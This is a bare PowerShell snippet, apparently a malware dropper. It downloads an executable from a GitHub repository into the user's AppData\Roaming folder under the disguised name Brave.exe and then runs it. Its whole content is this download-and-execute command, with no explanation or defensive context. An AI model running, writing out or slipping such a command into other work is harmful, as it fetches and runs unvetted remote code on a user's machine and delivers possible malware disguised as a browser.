$n=Brave.exe
$e=New-Object System.Net.WebClient;$e.DownloadFile("https://github.com/dev-eloper-365/Tasks/raw/main/main.exe","$HOME\AppData\Roaming\$n");Start-Process -FilePath "$HOME\AppData\Roaming\$n"
